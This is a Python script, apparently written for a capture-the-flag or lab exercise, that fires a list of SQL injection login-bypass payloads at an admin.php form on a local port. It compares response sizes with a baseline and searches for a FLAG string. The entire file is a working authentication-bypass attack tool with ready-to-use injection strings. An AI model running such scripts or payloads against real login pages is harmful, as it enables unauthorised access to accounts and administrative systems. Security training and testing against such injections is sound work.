import requests
import re

target_url = "http://127.0.0.1:32816/admin.php"
session_cookie = {"PHPSESSID": "40bd21fd631cfebd5f684d8a97f3d915"}

payloads = [
    "admin' OR '1'='1",
    "admin'--",
    "admin' #",
    "' OR 1=1--",
    "admin' OR 1=1--",
    "' OR '1'='1'--",
    "admin' OR '1'='1'--",
    "') OR ('1'='1",
    "admin') OR ('1'='1')--",
    "' OR 'a'='a"
]

# Baseline
baseline = requests.post(target_url, data={"username": "test", "password": "test"}, cookies=session_cookie, allow_redirects=False)
baseline_len = len(baseline.content)

print(f"Baseline: {baseline.status_code} | {baseline_len}B\n")

# Test each payload
for payload in payloads:
    resp = requests.post(target_url, data={"username": payload, "password": "pass"}, cookies=session_cookie, allow_redirects=False)
    
    diff = "DIFF" if len(resp.content) != baseline_len else "same"
    loc = resp.headers.get('Location', '-')
    
    print(f"{payload[:30]:30} | {resp.status_code} | {len(resp.content):5}B | {diff} | {loc}")
    
    # Check for flag
    if 'FLAG{' in resp.text:
        flag = re.search(r'FLAG\{[^}]+\}', resp.text)
        if flag:
            print(f"  >>> FLAG FOUND: {flag.group(0)}")
            print(f"  >>> Full response:\n{resp.text}")

